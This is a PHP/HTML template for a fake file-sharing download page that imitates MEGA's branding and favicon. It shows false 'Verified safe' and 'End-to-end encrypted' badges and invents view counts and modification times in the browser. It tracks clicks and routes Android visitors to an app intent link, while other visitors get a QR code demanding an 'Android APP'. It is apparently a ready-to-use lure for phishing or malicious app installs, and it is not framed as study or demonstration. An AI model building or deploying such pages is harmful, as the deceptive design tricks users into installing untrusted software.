<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Files - <?php echo $name; ?></title>
    <link rel="icon" href="https://mega.nz/favicon.ico">
    <meta property="og:description" content="Securely shared file on Private Files">
    <?php if($previewUrl): ?><meta property="og:image" content="<?php echo $previewUrl; ?>"><?php endif; ?>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        :root{--mega-red:#ee1423;--bg:#121212;--card:#1e1e1e;--text:#fff;--border:#333}
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Roboto',sans-serif;background: radial-gradient(circle at center, #1a1a1a 0%, #000 100%);color:var(--text);display:flex;flex-direction:column;min-height:100vh}
        .header{height:56px;padding:0 24px;display:flex;align-items:center;background:#000;position:sticky;top:0;z-index:100;width:100%;border-bottom:1px solid #222}
        .header .logo{color:var(--mega-red);font-weight:700;font-size:24px;letter-spacing:-1px}
        .main{flex:1;display:flex;justify-content:center;align-items:center;padding:24px}
        .mega-card{width:100%;max-width:480px;background:var(--card);border-radius:12px;border:1px solid var(--border);padding:32px;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.4)}
        .file-icon-box{width:80px;height:80px;background:rgba(255,255,255,0.05);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;border:2px solid var(--mega-red)}
        .file-icon-box span{font-size:40px}
        .file-name{font-size:20px;font-weight:500;margin-bottom:8px;word-break:break-all}
        .file-meta{color:#888;font-size:14px;margin-bottom:24px;display:flex;justify-content:center;gap:12px}
        .preview-box{width:100%;height:200px;background:#000;border-radius:8px;margin-bottom:24px;overflow:hidden;border:1px solid var(--border)}
        .preview-box img{width:100%;height:100%;object-fit:cover;opacity:0.8}
        .btn-mega{background:var(--mega-red);color:#fff;border:none;padding:14px 48px;border-radius:30px;font-size:16px;font-weight:500;cursor:pointer;width:100%;transition:transform 0.2s}
        .btn-mega:hover{transform:scale(1.02);background:#f12d3b}
        .trust-badges{display:flex;justify-content:center;gap:20px;margin-top:24px;font-size:12px;color:#666}
        .footer{padding:24px;text-align:center;font-size:11px;color:#555;padding-bottom:3rem}
        .footer a{color:#777;text-decoration:none;margin:0 8px}
        /* Modal */
        .modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:1000;align-items:center;justify-content:center;padding:16px}
        .modal-overlay.show{display:flex}
        .modal{background:#222;border:1px solid var(--border);border-radius:12px;padding:32px;width:100%;max-width:380px;text-align:center}
        .modal .qr{background:#fff;padding:12px;border-radius:8px;display:inline-block;margin:24px 0}
        .modal .qr img{width:200px;height:200px}
        .modal h2{color:var(--mega-red)}
    </style>
</head>
<body>
<div class="header"><div class="logo">Shared by <?php echo $by; ?></div></div>
<div class="main">
    <div class="mega-card">
        <div class="file-icon-box"><span><?php echo $typeInfo['icon']; ?></span></div>
        <div class="file-name"><?php echo $name; ?></div>
        <div class="file-meta">
            <span><?php echo $size; ?></span>
            <span>•</span>
            <span id="timeLabel">Just now</span>
        </div>
        <?php if($previewUrl): ?>
        <div class="preview-box"><img src="<?php echo $previewUrl; ?>" alt="Preview"></div>
        <?php endif; ?>
        <button class="btn-mega" onclick="handleOpen()">Download to device</button>
        <div class="trust-badges">
            <span>Verified safe</span>
            <span>End-to-end encrypted</span>
        </div>
    </div>
</div>
<footer class="footer">
    <p>© Private Files style MEGA Landing</p>
    <div style="margin-top:8px">
        <a href="<?php echo $reportUrl; ?>">Report content</a>
        <a href="/privacy-policy.html">Privacy</a>
        <a href="/terms-of-usage.html">Contacts</a>
    </div>
</footer>
<div class="modal-overlay" id="modal">
    <div class="modal">
        <h2>Android APP Required</h2>
        <p style="font-size:14px;color:#888;margin-top:8px">Scan this code to open in the Private Files Android application</p>
        <div class="qr"><img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&margin=8&data=<?php echo urlencode($currentUrl); ?>" alt="QR"></div>
        <button class="btn-mega" onclick="copyLink()" style="padding:10px">Copy link</button>
        <button onclick="closeModal()" style="background:none;border:none;color:#666;margin-top:20px;cursor:pointer">Dismiss</button>
    </div>
</div>
<script>
const intentUrl='<?php echo addslashes($intentUrl); ?>',shareLink='<?php echo addslashes($appDeepLink); ?>',token='<?php echo addslashes($token); ?>',uniqueId='<?php echo addslashes($uniqueId); ?>',landing='<?php echo addslashes($landing); ?>',isAndroid=/Android/i.test(navigator.userAgent);
const storageKey=`privatefiles_stats_${token}`;
document.addEventListener('DOMContentLoaded',()=>{
    let s=localStorage.getItem(storageKey);
    if(!s){s={v:<?php echo $views; ?>,t:<?php echo $timeAgo; ?>,l:Date.now()};}else{s=JSON.parse(s);}
    s.v++; const now=Date.now(); const passed=Math.floor((now-s.l)/60000); s.t=Math.min(s.t+passed,999); s.l=now;
    localStorage.setItem(storageKey,JSON.stringify(s));
    document.getElementById('timeLabel').textContent='Modified: '+(s.t<60?s.t+'m':Math.floor(s.t/60)+'h')+' ago';
});
function handleOpen(){
    if(uniqueId) fetch(`track_event.php?type=click&uniqueid=${uniqueId}&landing=${landing}`).catch(console.error);
    isAndroid?window.location.href=intentUrl:document.getElementById('modal').classList.add('show')
}
function closeModal(){document.getElementById('modal').classList.remove('show')}
function copyLink(){navigator.clipboard.writeText(shareLink).then(()=>alert('Link copied!'))}
document.getElementById('modal').onclick=e=>{if(e.target.id==='modal')closeModal()}
</script>
</body>
</html>
